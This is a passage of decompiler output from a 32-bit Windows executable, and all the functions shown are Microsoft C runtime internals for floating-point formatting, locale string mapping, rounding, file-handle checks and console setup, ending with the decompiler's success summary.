  char v13; // cl
  int v14; // ecx
  bool v15; // zf
  int v16; // esi
  unsigned int v17; // [esp-8h] [ebp-18h]
  bool v18; // [esp+Ch] [ebp-4h]

  if ( !Src || !a3 || !a4 || !a5 )
  {
    *_errno() = 22;
    _invalid_parameter_noinfo();
    return 22;
  }
  v12 = 0;
  if ( a6 == 65 || a6 == 69 || a6 == 70 || (v18 = 0, a6 == 71) )
    v18 = 1;
  v13 = a8;
  if ( (a8 & 8) == 0 )
  {
    v14 = __acrt_fp_classify(a1);
    if ( v14 )
      return fp_format_nan_or_infinity(v14, *((int *)a1 + 1) < 0, Src, a3, v18);
    v13 = a8;
  }
  if ( (v13 & 0x10) != 0 )
    v17 = 3;
  else
    v17 = 2;
  if ( (v13 & 0x20) != 0 )
    v12 = a11;
  if ( a6 > 97 )
  {
    v16 = a6 - 101;
    v15 = a6 == 101;
  }
  else
  {
    if ( a6 == 97 || a6 == 65 )
      return fp_format_a(a1, Src, a3, a4, a5, Size, v18, v17, a10, v12);
    v16 = a6 - 69;
    v15 = a6 == 69;
  }
  if ( v15 )
    return fp_format_e(a1, Src, a3, a4, a5, Size, v18, v17, a10, v12);
  if ( v16 == 1 )
    return fp_format_f(a1, Src, a3, a4, a5, Size, a10, v12);
  return fp_format_g(a1, Src, a3, a4, a5, Size, v18, v17, v12);
}
// 41A8A2: using guessed type int __cdecl __acrt_fp_classify(_DWORD);
// 41A9A7: using guessed type int __cdecl fp_format_a(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 41ACB6: using guessed type int __cdecl fp_format_e(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 41AEA6: using guessed type int __cdecl fp_format_f(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 41B0F9: using guessed type int __cdecl fp_format_nan_or_infinity(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (0041C831) --------------------------------------------------------
struct __crt_multibyte_data *sub_41C831()
{
  struct __acrt_ptd *v0; // eax

  v0 = (struct __acrt_ptd *)__acrt_getptd();
  return update_thread_multibyte_data_internal(v0, &dword_430704);
}
// 41A5F6: using guessed type int __acrt_getptd(void);

//----- (0041D64E) --------------------------------------------------------
int sub_41D64E()
{
  return try_get_function(20, "LCMapStringEx", &unk_427398, "LCMapStringEx");
}
// 41D749: using guessed type int __cdecl try_get_function(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (0041D668) --------------------------------------------------------
int sub_41D668()
{
  return try_get_function(22, "LocaleNameToLCID", &unk_4273B0, "LocaleNameToLCID");
}
// 41D749: using guessed type int __cdecl try_get_function(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (0041D956) --------------------------------------------------------
int __stdcall sub_41D956(
        wchar_t *a1,
        DWORD dwMapFlags,
        LPCWSTR lpSrcStr,
        int cchSrc,
        LPWSTR lpDestStr,
        int cchDest,
        int a7,
        int a8,
        int a9)
{
  int (__thiscall *v9)(_DWORD, wchar_t *, DWORD, LPCWSTR, int, LPWSTR, int, int, int, int); // eax
  LCID v11; // eax

  v9 = (int (__thiscall *)(_DWORD, wchar_t *, DWORD, LPCWSTR, int, LPWSTR, int, int, int, int))sub_41D64E();
  if ( v9 )
    return v9(v9, a1, dwMapFlags, lpSrcStr, cchSrc, lpDestStr, cchDest, a7, a8, a9);
  v11 = __acrt_LocaleNameToLCID(a1, 0);
  return LCMapStringW(v11, dwMapFlags, lpSrcStr, cchSrc, lpDestStr, cchDest);
}

//----- (0041DAC3) --------------------------------------------------------
char sub_41DAC3()
{
  dword_430810 = 0;
  return 1;
}

//----- (0041E0F6) --------------------------------------------------------
int sub_41E0F6()
{
  return common_flush_all(1);
}

//----- (0041E854) --------------------------------------------------------
bool __cdecl sub_41E854(char *a1, int a2, int a3, int a4)
{
  int v5; // eax
  _BYTE *v6; // eax

  if ( !a4 )
    return *a1 >= 53;
  v5 = fegetround();
  if ( v5 )
  {
    if ( v5 == 512 )
    {
      if ( *a1 != 48 && a2 != 45 )
        return 1;
    }
    else if ( v5 == 256 && *a1 != 48 && a2 == 45 )
    {
      return 1;
    }
  }
  else
  {
    if ( *a1 > 53 )
      return 1;
    if ( *a1 >= 53 )
    {
      v6 = a1 + 1;
      if ( a3 )
      {
        while ( *v6 == 48 )
          ++v6;
        if ( !*v6 )
          return *(a1 - 1) & 1;
      }
      return 1;
    }
  }
  return 0;
}

//----- (00422B58) --------------------------------------------------------
int __cdecl sub_422B58(int a1)
{
  int v2; // [esp+4h] [ebp-10h] BYREF
  int *v3; // [esp+8h] [ebp-Ch] BYREF
  int v4; // [esp+Ch] [ebp-8h] BYREF

  if ( a1 == -2 )
  {
    *__doserrno() = 0;
    *_errno() = 9;
  }
  else
  {
    if ( a1 >= 0
      && a1 < (unsigned int)dword_4305A0
      && (*(_BYTE *)(dword_4303A0[a1 >> 6] + 56 * (a1 & 0x3F) + 40) & 1) != 0 )
    {
      v4 = a1;
      v3 = &a1;
      v2 = a1;
      return __crt_seh_guarded_call<int>::operator()<_lambda_218ce3db14220d0be481dae8ef3383b6_,_lambda_628dfdc04ba53c8bfc02c9951375f3f5_ &,_lambda_57dc472bd5c9d5f3b2cbca59b8a843ae_>(
               &v2,
               &v3,
               &v4);
    }
    *__doserrno() = 0;
    *_errno() = 9;
    _invalid_parameter_noinfo();
  }
  return -1;
}
// 422ACC: using guessed type _DWORD __stdcall __crt_seh_guarded_call<int>::operator()<_lambda_218ce3db14220d0be481dae8ef3383b6_,_lambda_628dfdc04ba53c8bfc02c9951375f3f5_ &,_lambda_57dc472bd5c9d5f3b2cbca59b8a843ae_>(_DWORD, _DWORD, _DWORD);
// 4303A0: using guessed type int dword_4303A0[124];
// 4305A0: using guessed type int dword_4305A0;
// 422B58: using guessed type int var_8;

//----- (00422D40) --------------------------------------------------------
BOOL sub_422D40()
{
  char *v0; // ecx

  v0 = (char *)hConsoleOutput;
  if ( hConsoleOutput == (HANDLE)-2 )
  {
    __dcrt_lowio_initialize_console_output();
    v0 = (char *)hConsoleOutput;
  }
  return v0 + 1 != 0;
}

//----- (00423CF0) --------------------------------------------------------
int __usercall sub_423CF0@<eax>(double _ST7@<st0>)
{
  int result; // eax
  unsigned __int16 v2; // cx
  double v6; // [esp+0h] [ebp-14h]
  __int16 v7; // [esp+8h] [ebp-Ch]

  if ( dword_42FD50 >= 2 )
    return (int)_ST7;
  v6 = _ST7;
  result = HIDWORD(v6);
  v2 = v7 & 0x7FFF;
  if ( (v7 & 0x7FFFu) < 0x3FFF )
  {
    __asm { frndint }
    return 0;
  }
  else
  {
    if ( v6 >= 0.0 )
      return 0x80000000;
    if ( v2 < 0x401Eu )
    {
      __asm { frndint }
      return (-((v7 & 0x8000) != 0) ^ (HIDWORD(v6) >> (62 - v7))) + ((v7 & 0x8000) != 0);
    }
    if ( v2 <= 0x401Eu && (v7 & 0x8000) != 0 && HIDWORD(v6) == 0x80000000 )
      __asm { frndint }
    else
      return 0x80000000;
  }
  return result;
}
// 423CF0: could not find valid save-restore pair for ebp
// 423D18: variable 'v7' is possibly undefined
// 42FD50: using guessed type int dword_42FD50;

// nfuncs=700 queued=215 decompiled=215 lumina nreq=0 worse=0 better=0
// ALL OK, 215 function(s) have been successfully decompiled
